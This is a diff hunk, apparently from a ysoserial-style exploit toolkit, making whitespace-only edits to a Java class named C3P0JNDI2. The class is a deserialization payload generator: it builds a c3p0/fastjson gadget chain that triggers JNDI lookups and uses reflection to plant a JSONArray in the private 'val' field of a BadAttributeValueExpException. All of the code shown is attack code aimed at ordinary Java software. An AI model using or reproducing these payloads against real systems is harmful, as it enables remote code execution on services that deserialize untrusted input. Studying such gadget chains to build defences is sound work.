@@ -11,7 +11,7 @@ import java.util.HashMap;
 
 @Dependencies({"com.mchange:c3p0:0.9.5.2", "com.alibaba.fastjson:com.alibaba.fastjson1.X"})
 @Authors({Authors.UNAM4})
-public class C3P0JNDI2 implements  ObjectPayload<Object> {
+public class C3P0JNDI2 implements ObjectPayload<Object> {
     @Override
     public Object getObject(String command) throws Exception {
         if (command.toLowerCase().startsWith("jndi:")) {
@@ -27,7 +27,7 @@ public class C3P0JNDI2 implements  ObjectPayload<Object> {
         JSONArray jsonArray = new JSONArray();
         jsonArray.add(o);
 
-        BadAttributeValueExpException val      = new BadAttributeValueExpException(null);
+        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
         Field valfield = val.getClass().getDeclaredField("val");
         valfield.setAccessible(true);
         valfield.set(val, jsonArray);
